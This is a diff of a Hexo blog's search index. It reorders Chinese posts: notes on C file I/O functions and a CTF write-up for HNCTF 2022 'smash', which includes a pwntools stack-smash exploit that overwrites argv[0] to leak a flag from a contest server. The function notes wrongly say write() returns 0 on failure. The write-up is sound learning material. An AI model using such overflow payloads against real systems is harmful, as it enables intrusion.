@@ -923,6 +923,170 @@ Address space layout randomization</li>
       </tags>
   </entry>
   <entry>
+    <title>PWN PWN PWN !!! 技巧 (5)</title>
+    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(5)/</url>
+    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (5)</p>
+<span id="more"></span>
+
+<h1><span id="简介">简介：</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a></p>
+<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (2)</a></p>
+<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (3)</a></p>
+<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(4)/">PWN PWN PWN !!! 技巧 (4)</a></p>
+<p>紧接上续四部，这次准备记录一下常见的函数的功能（容易忘记，记录一手），好记性不如烂笔头。</p>
+<hr>
+<h2><span id="fgets">fgets</span></h2><p><code>fgets</code> 用于从指定的流中读取一行文本或字符串，并将其存储到指定的字符串变量中：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> n, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><code>str</code>：指向字符数组的指针，读取的字符串将存储在这里。</li>
+<li><code>n</code>：要读取的最大字符数（包括最终的 null 字符）。</li>
+<li><code>stream</code>：指向 FILE 对象的指针，该对象标识从中读取字符的流。</li>
+</ul>
+<p>停止读取的条件：</p>
+<ul>
+<li>读取了 <code>n-1</code> 个字符；</li>
+<li>读取了换行符；</li>
+<li>到达文件末尾。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>成功：返回 <code>str</code>；</li>
+<li>失败或 EOF：返回 <code>NULL</code>，<code>str</code> 不变。</li>
+</ul>
+<hr>
+<h2><span id="fclose">fclose</span></h2><p><code>fclose</code> 主要用于关闭一个打开的文件流，同时刷新所有缓冲区。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><code>stream</code>：指向要关闭的文件流对象。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>成功：返回 <code>0</code>；</li>
+<li>失败：返回 <code>EOF</code>。</li>
+</ul>
+<hr>
+<h2><span id="fopen">fopen</span></h2><p><code>fopen</code> 主要作用是打开一个文件以进行各种操作（读、写、追加等）。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><code>filename</code>：要打开的文件名。</li>
+<li><code>mode</code>：文件访问模式：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>模式</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;r&quot;</code></td>
+<td>以只读方式打开文件，文件不存在则返回 <code>NULL</code>。</td>
+</tr>
+<tr>
+<td><code>&quot;w&quot;</code></td>
+<td>以写方式打开文件，文件存在则清空，不存在则创建新文件。</td>
+</tr>
+<tr>
+<td><code>&quot;a&quot;</code></td>
+<td>以追加方式写入文件末尾，不存在则创建。</td>
+</tr>
+<tr>
+<td><code>&quot;r+&quot;</code></td>
+<td>打开可读可写文件，文件不存在返回 <code>NULL</code>。</td>
+</tr>
+<tr>
+<td><code>&quot;w+&quot;</code></td>
+<td>可读写，新建或清空文件内容。</td>
+</tr>
+<tr>
+<td><code>&quot;a+&quot;</code></td>
+<td>可读可写，追加到文件末尾，不存在则新建。</td>
+</tr>
+</tbody></table>
+<p>返回值：</p>
+<ul>
+<li>成功：返回 <code>FILE*</code> 指针；</li>
+<li>失败：返回 <code>NULL</code>。</li>
+</ul>
+<hr>
+<h2><span id="fwrite">fwrite</span></h2><p><code>fwrite</code> 将数据从 <code>ptr</code> 指向的数组写入到给定流中。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><code>ptr</code>：指向要写入的内存区域；</li>
+<li><code>size</code>：单个元素的大小（字节）；</li>
+<li><code>nmemb</code>：写入的元素数量；</li>
+<li><code>stream</code>：目标文件流指针。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>实际写入的元素数量，类型为 <code>size_t</code>；</li>
+<li>若不等于 <code>nmemb</code>，说明出错或写入不完整。</li>
+</ul>
+<hr>
+<h2><span id="write">write</span></h2><p><code>write</code> 将数据从缓冲区写入文件描述符（低层系统调用）。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><code>fd</code>：文件描述符（<code>1</code> 表示标准输出）；</li>
+<li><code>buf</code>：要写入的数据缓冲区；</li>
+<li><code>count</code>：要写入的字节数。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>成功：返回写入的字节数；</li>
+<li>失败：返回 <code>0</code>。</li>
+</ul>
+<hr>
+<h2><span id="fread">fread</span></h2><p><code>fread</code> 从指定文件流中读取数据，存储到给定缓冲区中。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><code>ptr</code>：指向接收数据的内存；</li>
+<li><code>size</code>：每个元素的大小（字节）；</li>
+<li><code>nmemb</code>：读取的元素数量；</li>
+<li><code>stream</code>：输入流指针。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>实际读取的元素数量（<code>size_t</code>）；</li>
+<li>若少于 <code>nmemb</code>，可能是 EOF 或出错。</li>
+</ul>
+<hr>
+<h2><span id="read">read</span></h2><p><code>read</code> 是一个低层函数，从文件描述符读取数据到内存缓冲区。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><code>fd</code>：文件描述符（例如，<code>0</code> 表示标准输入）；</li>
+<li><code>buf</code>：缓冲区；</li>
+<li><code>count</code>：要读取的最大字节数。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>成功：读取的字节数；</li>
+<li>失败：返回 <code>-1</code>，并设置 <code>errno</code>。</li>
+</ul>
+<hr>
+<h1><span id="总结">总结:</span></h1><p>了解函数的作用，可以更好地让我们在代码审计的过程中理清程序之间的逻辑，加油加油！！！</p>
+]]></content>
+      <categories>
+        <category>技巧</category>
+        <category>方法</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SHCTF 2023 [WEEK 1] PWN</title>
     <url>/SHCTF%202023%20%5BWEEK%201%5D%20PWN/</url>
     <content><![CDATA[<p>SHCTF 2023 [WEEK 1] PWN</p>
@@ -1108,170 +1272,6 @@ Address space layout randomization</li>
       </tags>
   </entry>
   <entry>
-    <title>PWN PWN PWN !!! 技巧 (5)</title>
-    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(5)/</url>
-    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (5)</p>
-<span id="more"></span>
-
-<h1><span id="简介">简介：</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a></p>
-<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (2)</a></p>
-<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (3)</a></p>
-<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(4)/">PWN PWN PWN !!! 技巧 (4)</a></p>
-<p>紧接上续四部，这次准备记录一下常见的函数的功能（容易忘记，记录一手），好记性不如烂笔头。</p>
-<hr>
-<h2><span id="fgets">fgets</span></h2><p><code>fgets</code> 用于从指定的流中读取一行文本或字符串，并将其存储到指定的字符串变量中：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> n, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>str</code>：指向字符数组的指针，读取的字符串将存储在这里。</li>
-<li><code>n</code>：要读取的最大字符数（包括最终的 null 字符）。</li>
-<li><code>stream</code>：指向 FILE 对象的指针，该对象标识从中读取字符的流。</li>
-</ul>
-<p>停止读取的条件：</p>
-<ul>
-<li>读取了 <code>n-1</code> 个字符；</li>
-<li>读取了换行符；</li>
-<li>到达文件末尾。</li>
-</ul>
-<p>返回值：</p>
-<ul>
-<li>成功：返回 <code>str</code>；</li>
-<li>失败或 EOF：返回 <code>NULL</code>，<code>str</code> 不变。</li>
-</ul>
-<hr>
-<h2><span id="fclose">fclose</span></h2><p><code>fclose</code> 主要用于关闭一个打开的文件流，同时刷新所有缓冲区。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>stream</code>：指向要关闭的文件流对象。</li>
-</ul>
-<p>返回值：</p>
-<ul>
-<li>成功：返回 <code>0</code>；</li>
-<li>失败：返回 <code>EOF</code>。</li>
-</ul>
-<hr>
-<h2><span id="fopen">fopen</span></h2><p><code>fopen</code> 主要作用是打开一个文件以进行各种操作（读、写、追加等）。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>filename</code>：要打开的文件名。</li>
-<li><code>mode</code>：文件访问模式：</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>模式</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>&quot;r&quot;</code></td>
-<td>以只读方式打开文件，文件不存在则返回 <code>NULL</code>。</td>
-</tr>
-<tr>
-<td><code>&quot;w&quot;</code></td>
-<td>以写方式打开文件，文件存在则清空，不存在则创建新文件。</td>
-</tr>
-<tr>
-<td><code>&quot;a&quot;</code></td>
-<td>以追加方式写入文件末尾，不存在则创建。</td>
-</tr>
-<tr>
-<td><code>&quot;r+&quot;</code></td>
-<td>打开可读可写文件，文件不存在返回 <code>NULL</code>。</td>
-</tr>
-<tr>
-<td><code>&quot;w+&quot;</code></td>
-<td>可读写，新建或清空文件内容。</td>
-</tr>
-<tr>
-<td><code>&quot;a+&quot;</code></td>
-<td>可读可写，追加到文件末尾，不存在则新建。</td>
-</tr>
-</tbody></table>
-<p>返回值：</p>
-<ul>
-<li>成功：返回 <code>FILE*</code> 指针；</li>
-<li>失败：返回 <code>NULL</code>。</li>
-</ul>
-<hr>
-<h2><span id="fwrite">fwrite</span></h2><p><code>fwrite</code> 将数据从 <code>ptr</code> 指向的数组写入到给定流中。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>ptr</code>：指向要写入的内存区域；</li>
-<li><code>size</code>：单个元素的大小（字节）；</li>
-<li><code>nmemb</code>：写入的元素数量；</li>
-<li><code>stream</code>：目标文件流指针。</li>
-</ul>
-<p>返回值：</p>
-<ul>
-<li>实际写入的元素数量，类型为 <code>size_t</code>；</li>
-<li>若不等于 <code>nmemb</code>，说明出错或写入不完整。</li>
-</ul>
-<hr>
-<h2><span id="write">write</span></h2><p><code>write</code> 将数据从缓冲区写入文件描述符（低层系统调用）。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>fd</code>：文件描述符（<code>1</code> 表示标准输出）；</li>
-<li><code>buf</code>：要写入的数据缓冲区；</li>
-<li><code>count</code>：要写入的字节数。</li>
-</ul>
-<p>返回值：</p>
-<ul>
-<li>成功：返回写入的字节数；</li>
-<li>失败：返回 <code>0</code>。</li>
-</ul>
-<hr>
-<h2><span id="fread">fread</span></h2><p><code>fread</code> 从指定文件流中读取数据，存储到给定缓冲区中。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>ptr</code>：指向接收数据的内存；</li>
-<li><code>size</code>：每个元素的大小（字节）；</li>
-<li><code>nmemb</code>：读取的元素数量；</li>
-<li><code>stream</code>：输入流指针。</li>
-</ul>
-<p>返回值：</p>
-<ul>
-<li>实际读取的元素数量（<code>size_t</code>）；</li>
-<li>若少于 <code>nmemb</code>，可能是 EOF 或出错。</li>
-</ul>
-<hr>
-<h2><span id="read">read</span></h2><p><code>read</code> 是一个低层函数，从文件描述符读取数据到内存缓冲区。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>fd</code>：文件描述符（例如，<code>0</code> 表示标准输入）；</li>
-<li><code>buf</code>：缓冲区；</li>
-<li><code>count</code>：要读取的最大字节数。</li>
-</ul>
-<p>返回值：</p>
-<ul>
-<li>成功：读取的字节数；</li>
-<li>失败：返回 <code>-1</code>，并设置 <code>errno</code>。</li>
-</ul>
-<hr>
-<h1><span id="总结">总结:</span></h1><p>了解函数的作用，可以更好地让我们在代码审计的过程中理清程序之间的逻辑，加油加油！！！</p>
-]]></content>
-      <categories>
-        <category>技巧</category>
-        <category>方法</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SHCTF 2023 [WEEK 3] PWN</title>
     <url>/SHCTF%202023%20%5BWEEK%203%5D%20PWN/</url>
     <content><![CDATA[<p>SHCTF 2023 [WEEK 3] PWN</p>
@@ -1364,6 +1364,38 @@ Address space layout randomization</li>
       </tags>
   </entry>
   <entry>
+    <title>[HNCTF 2022 WEEK3] smash 复现</title>
+    <url>/%5BHNCTF%202022%20WEEK3%5D%20smash%20%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>[HNCTF 2022 WEEK3] smash 复现</p>
+<span id="more"></span>
+
+<h1><span id="smash">smash</span></h1><p>查看保护机制，正如题目的名字 smash（所以会涉及到花式栈溢出 stack smash），打开了 NX 和 canary</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p>IDA 一下，发现 gets 函数造成了溢出，并且 flag 存在 buf 里面</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
+<p>接下来我们就需要了解一下 stack smash<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">（花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)）</a></p>
+<blockquote>
+<h2><span id="stack-smash">Stack smash</span></h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p>
+</blockquote>
+<p>当我们了解了 Stack smash 后，我们就可以溢出到 arg[0]，然后将该指针改成 buf 就能获得 flag，下面就开始求偏移。</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p>两个地址相减就可得偏移 0x208（但是正确的偏移是 0x1f8，比正确的偏移多了 0x10，问了下学长可能是版本的问题，方法会了就行，小问题不伤大雅）</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p>也可以这样算</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
+<h2><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>HNCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[HGAME 2023 week1] PWN 复现</title>
     <url>/%5BHGAME%202023%20week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>[HGAME 2023 week1] PWN 复现</p>
@@ -1406,38 +1438,6 @@ Address space layout randomization</li>
       <tags>
         <tag>PWN</tag>
         <tag>HGAME</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[HNCTF 2022 WEEK3] smash 复现</title>
-    <url>/%5BHNCTF%202022%20WEEK3%5D%20smash%20%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>[HNCTF 2022 WEEK3] smash 复现</p>
-<span id="more"></span>
-
-<h1><span id="smash">smash</span></h1><p>查看保护机制，正如题目的名字 smash（所以会涉及到花式栈溢出 stack smash），打开了 NX 和 canary</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>IDA 一下，发现 gets 函数造成了溢出，并且 flag 存在 buf 里面</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
-<p>接下来我们就需要了解一下 stack smash<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">（花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)）</a></p>
-<blockquote>
-<h2><span id="stack-smash">Stack smash</span></h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p>
-</blockquote>
-<p>当我们了解了 Stack smash 后，我们就可以溢出到 arg[0]，然后将该指针改成 buf 就能获得 flag，下面就开始求偏移。</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
-<p>两个地址相减就可得偏移 0x208（但是正确的偏移是 0x1f8，比正确的偏移多了 0x10，问了下学长可能是版本的问题，方法会了就行，小问题不伤大雅）</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
-<p>也可以这样算</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
-<h2><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>HNCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1644,6 +1644,17 @@ Address space layout randomization</li>
 ]]></content>
   </entry>
   <entry>
+    <title>highlight-test</title>
+    <url>/highlight-test/</url>
+    <content><![CDATA[<p>高亮部分修改</p>
+<span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印 Hello World 到终端</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>)  <span class="comment"># ✅ 输出语句</span></span><br></pre></td></tr></table></figure>
+
+<p>啊啊啊</p>
+]]></content>
+  </entry>
+  <entry>
     <title>简单的 Hexo 文章示例</title>
     <url>/%E7%BB%83%E4%B9%A0/</url>
     <content><![CDATA[<p>这是一篇非常简单的 Hexo 文章示例。</p>
@@ -1669,16 +1680,5 @@ sljkdfkljd
         <tag>hexo</tag>
         <tag>demo</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>highlight-test</title>
-    <url>/highlight-test/</url>
-    <content><![CDATA[<p>高亮部分修改</p>
-<span id="more"></span>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印 Hello World 到终端</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>)  <span class="comment"># ✅ 输出语句</span></span><br></pre></td></tr></table></figure>
-
-<p>啊啊啊</p>
-]]></content>
   </entry>
 </search>
